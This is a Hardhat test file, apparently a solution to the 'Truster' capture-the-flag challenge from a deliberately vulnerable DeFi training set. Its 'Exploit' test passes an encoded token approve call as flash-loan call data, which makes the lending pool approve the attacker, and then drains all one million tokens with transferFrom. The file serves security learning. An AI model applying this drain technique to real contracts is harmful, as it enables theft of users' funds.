import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import {
  DamnValuableToken,
  DamnValuableToken__factory,
  TrusterLenderPool,
  TrusterLenderPool__factory,
} from "../../typechain";
import { getBigNumber } from "../../utils";

describe("[Challenge] Truster", () => {
  let LenderPool: TrusterLenderPool;
  let Token: DamnValuableToken;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  const TOKENS_IN_POOL = getBigNumber(1000000);

  before(async () => {
    [owner, attacker] = await ethers.getSigners();

    const tokenFactory = (await ethers.getContractFactory(
      "DamnValuableToken",
      owner
    )) as DamnValuableToken__factory;
    Token = await tokenFactory.deploy();

    const contractFactory = (await ethers.getContractFactory(
      "TrusterLenderPool",
      owner
    )) as TrusterLenderPool__factory;
    LenderPool = await contractFactory.deploy(Token.address);

    await Token.transfer(LenderPool.address, TOKENS_IN_POOL);

    expect(await Token.balanceOf(LenderPool.address)).to.equal(TOKENS_IN_POOL);

    expect(await Token.balanceOf(attacker.address)).to.equal("0");
  });

  it("Exploit", async () => {
    const data = Token.interface.encodeFunctionData("approve", [
      attacker.address,
      TOKENS_IN_POOL,
    ]);

    await LenderPool.flashLoan(0, attacker.address, Token.address, data);
    await Token.connect(attacker).transferFrom(
      LenderPool.address,
      attacker.address,
      TOKENS_IN_POOL
    );
  });

  after(async () => {
    /** SUCCESS CONDITIONS */
    expect(await Token.balanceOf(attacker.address)).to.equal(TOKENS_IN_POOL);
    expect(await Token.balanceOf(LenderPool.address)).to.equal("0");
  });
});
